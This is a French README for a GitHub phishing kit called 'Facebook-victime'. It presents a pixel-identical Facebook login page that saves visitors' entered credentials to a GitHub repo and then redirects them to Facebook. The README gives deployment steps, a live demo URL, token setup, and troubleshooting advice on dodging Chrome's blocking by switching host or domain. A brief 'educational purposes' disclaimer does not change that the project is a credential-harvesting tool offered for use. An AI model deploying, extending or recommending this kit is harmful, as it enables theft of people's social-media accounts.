# 🔐 Facebook Login Interface

Une interface de connexion Facebook réaliste avec système de sauvegarde automatique des identifiants sur GitHub.

## 🌟 Fonctionnalités

· 🎨 Interface identique à Facebook
· 📱 Design responsive pour tous appareils
· 💾 Sauvegarde automatique sur GitHub
· 🔄 Redirection intelligente vers Facebook
· ⚡ Temps réel - Données sauvegardées instantanément
· 🔒 Sécurisé - Configuration professionnelle

## 🚀 Démo

https://img.shields.io/badge/Demo-Live-green
https://img.shields.io/badge/Version-2.0-blue

URL de démonstration : https://fb-community-meta.vercel.app

# 🛠️ Installation

*Prérequis*

· Node.js 16+
· Compte GitHub
· Compte Vercel/Netlify

*Installation locale* 

```bash
# Cloner le repository
git clone https://github.com/winner2for/Facebook-victime.git

# Accéder au dossier
cd Facebook-victime

# Installer les dépendances
npm install

# Démarrer en développement
npm run dev
```

# ⚙️ Configuration

## Variables d'environnement

Créez un fichier .env ou configurez-les sur votre plateforme d'hébergement :

```env
GITHUB_TOKEN=votre_token_github
GITHUB_OWNER=votre_username
GITHUB_REPO=Facebook-victime
```

# Configuration GitHub Token

1. Allez sur GitHub Settings → Developer settings → Personal access tokens
2. Générez un nouveau token avec les permissions :
   · ✅ repo (Full control)
   · ✅ workflow
3. Copiez le token (commence par ghp_)

## 🎯 Utilisation

1. Déployez le projet sur Vercel/Netlify
2. Configurez les variables d'environnement
3. Accédez à votre site
4. Les identifiants sont automatiquement sauvegardés dans le dossier logins/ de votre repo GitHub

# 🌐 Hébergement Recommandé

### 🥇 Vercel (Recommandé)

```bash
# Installation de Vercel CLI
npm i -g vercel

# Déploiement
vercel --prod
```

*Avantages :* 

· ⚡ Déploiement instantané
· 🔄 Intégration GitHub automatique
· 🆓 Plan gratuit généreux
· 🌍 CDN global

### 🥈 Netlify

```bash
# Via l'interface graphique
# Allez sur netlify.com et importez votre repo
```

*Avantages :*

· 🎯 Meilleur compatibilité mobile
· 🔧 Configuration simplifiée
· 🛡️ Moins de restrictions de sécurité

### 🥉 Render.com

* Avantages :*

· 💰 Plan gratuit permanent
· 🔄 Déploiements automatiques
· 📊 Monitoring intégré

# 🏅 Autres Options

· Railway.app - Excellent pour les projets Node.js
· Fly.io - Parfait pour la globalisation
· DigitalOcean App Platform - Professionnel et fiable

## 📁 Structure du Projet

```
Facebook-victime/
├── 📄 index.html          # Interface de connexion
├── 🎨 style.css           # Styles Facebook-like
├── ⚡ script.js           # Logique client
├── 🔧 api/
│   └── login.js          # Endpoint de sauvegarde
├── 📦 package.json       # Dépendances
└── ⚙️ vercel.json        # Configuration Vercel
```

# 🔄 Fonctionnement

1. Utilisateur saisit ses identifiants
2. Envoi API vers /api/login
3. Sauvegarde GitHub dans le dossier logins/
4. Redirection vers Facebook mobile
5. Historique complet conservé

# 🐛 Dépannage

*Problèmes Courants* 

Problème Solution
Chrome bloque le site Utiliser Netlify ou nouveau domaine
Erreur 401 GitHub Vérifier le token GitHub
Données non sauvegardées Vérifier les variables d'environnement
Redirection échoue Vérifier les URLs mobiles

*Logs de Debug*

Les logs détaillés sont disponibles dans :

· Vercel → Projet → Functions → api/login
· Netlify → Deploys → Functions Logs

# 🤝 Contribution

Les contributions sont les bienvenues !

1. Fork le projet
2. Créez une branche (git checkout -b feature/AmazingFeature)
3. Commit vos changements (git commit -m 'Add AmazingFeature')
4. Push sur la branche (git push origin feature/AmazingFeature)
5. Ouvrez une Pull Request

# 🎯 Bonnes Pratiques

· 📝 Documentation claire
· 🧪 Tests si possible
· 📱 Responsive design
· 🔒 Sécurité des données

## 📈 Statistiques

https://img.shields.io/github/forks/winner2for/Facebook-victime?style=social
https://img.shields.io/github/stars/winner2for/Facebook-victime?style=social
https://img.shields.io/github/issues/winner2for/Facebook-victime
https://img.shields.io/github/issues-pr/winner2for/Facebook-victime

# 🛡️ Sécurité

· 🔐 Tokens stockés de manière sécurisée
· 🌐 CORS configuré
· 📧 Aucune donnée envoyée par email
· 💾 Stockage privé sur GitHub

## 📄 Licence

Ce projet est sous licence MIT - voir le fichier LICENSE pour plus de détails.

## ⚠️ Avertissement

Ce projet est créé à des fins éducatives et de démonstration. Respectez toujours :

· Les lois sur la vie privée
· Les conditions d'utilisation des plateformes
· L'éthique en matière de sécurité

Utilisez de manière responsable.

# 👨‍💻 Auteur

### winner2for  & precieux0

### · GitHub: @winner2for and @precieux0
### · Email: okitakoyprecieux@gmail.com

# 🙏 Remerciements

· Facebook pour l'inspiration du design
· Vercel pour l'hébergement gratuit
· GitHub pour l'API de stockage
· La communauté open source

---

# ⭐ N'oubliez pas de mettre une étoile au repo si ce projet vous est utile !

https://img.shields.io/github/repo-size/winner2for/Facebook-victime
https://img.shields.io/github/last-commit/winner2for/Facebook-victime
https://img.shields.io/github/contributors/winner2for/Facebook-victime

*Déployez maintenant et testez par vous-même ! 🚀*
